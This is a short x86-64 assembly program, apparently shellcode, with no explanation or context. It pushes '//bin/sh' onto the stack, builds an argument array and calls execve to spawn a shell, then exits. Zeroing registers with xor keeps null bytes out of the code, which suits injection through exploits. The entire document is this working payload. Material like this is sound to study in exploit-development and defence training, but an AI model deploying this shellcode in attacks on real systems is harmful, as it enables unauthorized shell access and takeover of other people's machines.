global _start

section .text
_start:
    xor eax, eax
    push rax
    mov rbx, 0x68732F6E69622F2F
    push rbx
    mov rdi, rsp

    push rax
    push rdi
    mov rsi, rsp
    
    xor rdx, rdx 

    xor eax, eax
    mov al, 59
    syscall

    xor eax, eax
    mov al, 60
    syscall